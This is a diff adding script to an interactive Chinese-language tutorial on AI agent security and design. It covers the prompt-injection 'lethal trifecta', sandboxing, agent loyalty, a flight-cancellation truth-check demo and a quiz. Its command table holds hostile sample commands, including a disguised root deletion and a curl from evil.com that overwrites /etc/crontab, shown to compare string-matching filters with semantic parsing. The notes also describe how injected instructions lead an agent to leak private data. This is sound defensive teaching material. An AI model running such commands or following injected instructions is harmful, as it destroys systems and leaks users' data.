+    ? '<b style="color:var(--alert)">攻击路径闭合。</b>恶意指令从不受信任内容进来，读私有数据，经外部通道送出。' + (triOn.mem ? '加上持久记忆，攻击还能跨会话潜伏。' : '') + '切断任意一环都能断开这条链，最常用的是沙盒默认断网（切第三要素）。'
+    : '<b>链条未闭合</b>，缺：' + missing.join('、') + '。' + (triOn.mem ? '但写进记忆的内容仍需与外部内容同等审查。' : '');
+}
+drawTri();
+var cmds = [
+  ['rm -rf /tmp/build', '拦', '拦', '最普通的情况，两者都拦得住。'],
+  ['$(echo rm) -rf /', '放', '拦', '子 shell 拼出了 rm，字符串匹配看不到。语义解析展开命令后识别出删除根目录。'],
+  ["find / -name '*.log' -exec rm {} \\;", '放', '拦', '以 find 开头，删除藏在 -exec 参数里。语义解析知道 -exec 会消费后面的参数并执行。'],
+  ['curl -o /etc/crontab http://evil.com/payload', '放', '拦', '看似下载文件，实际覆盖系统定时任务。要理解 -o 的目标路径。'],
+  ['ls -la src/', '放', '放', '只读的正常命令，两者都放行。']
+];
+$('#cmdT').innerHTML = cmds.map(function (c, i) { return '<tr data-i="' + i + '" style="cursor:pointer"><td><code>' + c[0].replace(/</g, '&lt;') + '</code></td><td style="color:' + (c[1] === '拦' ? 'var(--ok)' : (c[2] === '拦' ? 'var(--alert)' : 'var(--ink-2)')) + '">' + c[1] + '</td><td style="color:' + (c[2] === '拦' ? 'var(--ok)' : 'var(--ink-2)') + '">' + c[2] + '</td></tr>'; }).join('');
+S.$$('#cmdT tr').forEach(function (tr) { tr.addEventListener('click', function () { S.$$('#cmdT tr').forEach(function (x) { x.classList.remove('on'); }); tr.classList.add('on'); $('#cmdCap').textContent = cmds[+tr.getAttribute('data-i')][3]; }); });
+S.notes($('#n-sec'), {
+  c: [
+    ['致命三要素', '访问私有数据 + 暴露于不受信任内容 + 外部通信能力（Simon Willison）。'],
+    ['持久记忆', '原书补充的放大器：让一次性攻击变成跨会话的长期威胁。'],
+    ['语义解析', '理解命令的参数类型和消费规则，识别藏在合法命令里的危险操作。'],
+    ['委托方忠诚', 'Agent 在多方交互中站在谁一边；提示注入本质上是一次策反。']
+  ],
+  p: [
+    ['四类边界', '数据边界、输入信任边界、输出影响边界、跨会话边界。'],
+    ['重点不是识别所有攻击', '而是让 Agent 即使被注入也没机会把危险动作执行出去。'],
+    ['沙盒三件事', '网络出口默认断网走白名单；源码只读、凭证不挂载；资源限额并返回结构化超时错误。'],
+    ['忠诚度守则', '保护主人隐私（连是否存在都不透露）；拒绝时不念清单；底线 ≠ 对外立场；只执行主人明确的指令；顶住施压。'],
+    ['忠诚度是跷跷板', '堵死泄密容易滑向过度拒绝，两端都会翻车。']
+  ]
+});
+
+/* ---------- 6 真值校验 ---------- */
+var fields = [
+  ['used', '已使用航段', ['否', '是']], ['hours', '预订至今', ['10 小时', '3 天']], ['airline', '航空公司取消', ['否', '是']],
+  ['cabin', '舱位', ['economy', 'business', 'basic_economy']], ['ins', '旅行保险', ['无', '有']]
+];
+var truth = {}, claim = {};
+function sel(parent, f, store, def) {
+  var l = h('label', null, parent); h('span', { text: f[1] }, l);
+  var s = h('select', null, l);
+  f[2].forEach(function (o, i) { var op = h('option', { value: i, text: o }, s); if (i === def) op.selected = true; });
+  store[f[0]] = def; s.addEventListener('change', function () { store[f[0]] = +s.value; });
+}
+fields.forEach(function (f) { sel($('#dbTruth'), f, truth, f[0] === 'hours' ? 1 : 0); });
+[['cabin', '你认为的舱位', ['economy', 'business', 'basic_economy', '不填']], ['ins', '你认为的保险', ['无', '有', '不填']]].forEach(function (f) { sel($('#dbClaim'), f, claim, f[0] === 'cabin' ? 1 : 2); });
+$('#dbGo').addEventListener('click', function () {
+  var log = [], cabins = ['economy', 'business', 'basic_economy'];
+  var cab = cabins[truth.cabin], ins = truth.ins === 1;
+  if (claim.cabin !== 3 && cabins[claim.cabin] !== cab) log.push('log_mismatch: cabin_class 自报 ' + cabins[claim.cabin] + '，真值 ' + cab);
+  if (claim.ins !== 2 && (claim.ins === 1) !== ins) log.push('log_mismatch: has_insurance 自报 ' + (claim.ins === 1) + '，真值 ' + ins);
+  var r;
+  if (truth.used) r = { s: false, m: 'Cannot cancel with used segments（规则 1）' };
+  else if (truth.hours === 0) r = { s: true, m: 'Cancelled within 24-hour window（规则 2）' };
+  else if (truth.airline) r = { s: true, m: 'Airline cancelled flight（规则 3）' };
+  else if (cab === 'business') r = { s: true, m: 'Business class cancellation（规则 4）' };
+  else r = ins ? { s: true, m: cab + ' with insurance（规则 5）' } : { s: false, m: cab + ' requires insurance（规则 5）' };
+  var txt = (log.length ? log.join('\n') + '\n' : '') + '→ {"success": ' + r.s + ', "reason": "' + r.m + '"}';
+  if (log.length) txt += '\n\n模型的自报和数据库对不上：裁决仍按真值。这条告警可用于发现模型的错误认知，或潜在的提示注入。';
+  $('#dbOut').textContent = txt;
+});
+S.notes($('#n-meta'), {
+  c: [
+    ['元能力', '能创造其他能力的能力：当场写出新工具、新约束、新表达形式。'],
+    ['六个方向', '思考工具、业务规则、多媒体、系统适配器、生成式 UI、Agent 自举。'],
+    ['参数作为 checklist', '用可选的 expected_* 参数让模型显式写出判断依据，引导调用前逐条核对。'],
+    ['服务端真值校验', '政策事实全部查库、时间取服务端时钟，不采信模型自报。']
+  ],
+  p: [
+    ['LLM 理解，代码计算', '符号计算、约束求解弥补概率推理的不足。'],
+    ['脚手架厚度看模型', '模型越强，代码辅助的增益越小；评估技术要注明配的什么模型。'],
+    ['自然语言规则与代码化规则互补', '前者用于解释和找变通方案，后者是关键决策点的守门员。'],
+    ['三重保障', '提示词规则帮理解；工具描述和参数当 checklist；真值校验守最后一关。'],
+    ['独立性', '不仅指独立的模型，更指模型无法伪造的独立数据来源。']
+  ]
+});
+
+/* ---------- 7 更多用法 ---------- */
+S.quiz($('#moreQ'), [
+  { q: '生成一个“外径 80mm、4 个均布 M5 孔、孔位圆 60mm”的法兰盘，走哪条路？', o: ['3D 生成模型', '写 CadQuery / OpenSCAD 代码'], a: 1, why: '产物有紧凑的精确描述，代码是无损表达，可程序化验证尺寸，改成 M6 只改一个参数。' },
+  { q: '生成一盆绿植的 3D 模型？', o: ['写代码', '3D 生成模型'], a: 1, why: '内在复杂度近乎无限，代码即使加噪声也僵硬。两条路也能混用：几何体用代码，纹理用生成模型。' },
+  { q: '用户问“去年各部门平均工资”，结果有几千行。更好的做法？', o: ['Agent 执行 SQL 后读完结果再用文字描述', 'Agent 只写 SQL 作为 artifact，由系统执行并直接渲染'], a: 1, why: 'LLM 抄写大量数据又慢又容易错。但执行层仍要只读账号、只放行 SELECT、参数化、限时限行。' },
+  { q: 'PPT 生成为什么用两个 Agent，而不是一个 Agent 自己渲染自己改？', o: ['两个 Agent 更便宜', '上下文管理：Reviewer 只看最新渲染图，Proposer 只累积文字反馈'], a: 1, why: '单 Agent 要在同一上下文里累积几十页、多轮的渲染图，很快超限。' },
+  { q: 'Agent 动态生成的业务代码漏写了权限判断，怎样保证不越权？', o: ['在提示词里强调一定要检查权限', '把信任边界下移到数据层：行级安全 + 受信任运行时绑定的访问上下文'], a: 1, why: '安全目标不是“AI 每次都写对”，而是“写错了也绕不过去”。' },
+  { q: '让 Agent 开发一个新 Agent，最有效的方法？', o: ['在提示词里列出所有最佳实践', '给一个经过验证的高质量 Agent 实现，让它复制后针对性修改'], a: 1, why: '范例代码本身就是最佳实践的载体，架构上的好选择会自然保留。' }
+]);
+S.notes($('#n-more'), {
+  c: [
+    ['生成式 UI', 'Agent 动态生成表单、图表乃至应用，替代纯文本交互。'],
+    ['A2UI', '声明式界面协议：Agent 只输出界面描述，客户端用受信任组件渲染；AG-UI 则是事件传输协议，两者互补。'],
+    ['Artifact 模式', 'Agent 生成 SQL 或可视化代码作为可执行产物，数据不经过 LLM。'],
+    ['Agent 自举', '用代码修复和创造 Agent；OpenClaw doctor 先确定性检查，再 LLM 兜底长尾。']
+  ],
+  p: [
+    ['代码还是生成模型', '看产物有无紧凑精确描述、精度要求和可验证性、是否需要参数化编辑。'],
+    ['提议者—审核者做内容', '审核者接触到提议者看不到的新信息（渲染结果），迭代到达标或预算上限。'],
+    ['系统适配器', '现场写胶水代码；无 API 的系统用 Computer Use 操作一遍再固化成 RPA（第 9 篇）。'],
+    ['HTML 交付成果', '交互演示、更好的可视化、可持续更新的活文档，胜过一份线性的 Markdown 汇报。'],
+    ['信任边界下移到数据层', '应用层可以预检查改善体验，数据层保留最终裁决权，所有访问路径都要经过它。']
+  ]
+});
